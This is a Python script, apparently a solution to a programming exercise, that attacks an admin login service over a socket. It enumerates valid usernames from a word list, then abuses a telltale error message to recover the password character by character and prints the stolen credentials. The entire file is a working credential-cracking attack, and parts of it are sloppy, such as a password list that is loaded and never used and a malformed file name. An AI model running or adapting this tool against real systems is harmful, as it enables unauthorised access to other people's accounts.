#!/usr/bin/env python
import json
import os
import socket
import argparse
import string
import random


DESCRIPTION = 'Connects to an unprotected admin website '
alpha_digit = list(''.join((string.ascii_lowercase, string.digits, string.ascii_uppercase)))


def cli_parser():
    parser = argparse.ArgumentParser(description=DESCRIPTION)
    parser.add_argument('ip',
                        help='Enter the IP address for the admin website')
    parser.add_argument('port', type=int,
                        help='Enter the port to be used.')
    return parser.parse_args()


class SocketHandler:
    """ Creates and manages both server and clients socket servers. """

    def __init__(self, host, port, file_path):
        self.host = host
        self.port = port
        self.address = (self.host, self.port)
        self.file_path = file_path

        self.passes = list(self.load_file())

    def try_login(self):
        current_dir = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(current_dir, r'logins.txt.')) as log:
            admins = [ad.strip() for ad in log.readlines()]
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
                client.connect(self.address)
                for login in admins:
                    msg = json.dumps({"login": login.strip(),
                                      "password": " "}).encode('utf-8')
                    client.sendall(msg)
                    server_response = json.loads(client.recv(1024).decode('utf-8'))
                    if server_response.get('result') == "Wrong password!":
                        break
                while True:
                    initial_check = random.choice(alpha_digit)
                    client.sendall(json.dumps({"login": login,
                                               "password": initial_check}).encode('utf-8'))
                    server_res = json.loads(client.recv(1024).decode('utf-8'))
                    if server_res.get("result") == "Exception happened during login":
                        break
                cracked_password = initial_check
                while True:
                    random_digit = random.choice(alpha_digit)
                    client.sendall(json.dumps(({"login": login,
                                                "password": cracked_password + random_digit})).encode('utf-8'))
                    response = json.loads(client.recv(1024).decode())
                    if response.get('result') == "Connection success!":
                        print(json.dumps({"login": login,
                                          "password": cracked_password + random_digit}))
                        break
                    elif response.get('result') == "Exception happened during login":
                        cracked_password += random_digit

    def load_file(self):
        current_path = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(current_path, self.file_path)) as f:
            for line in f:
                yield line.strip().upper()


def main():
    args = cli_parser()
    socket_class = SocketHandler(host=args.ip, port=args.port, file_path=r'passwords.txt')
    socket_class.try_login()


if __name__ == '__main__':
    main()
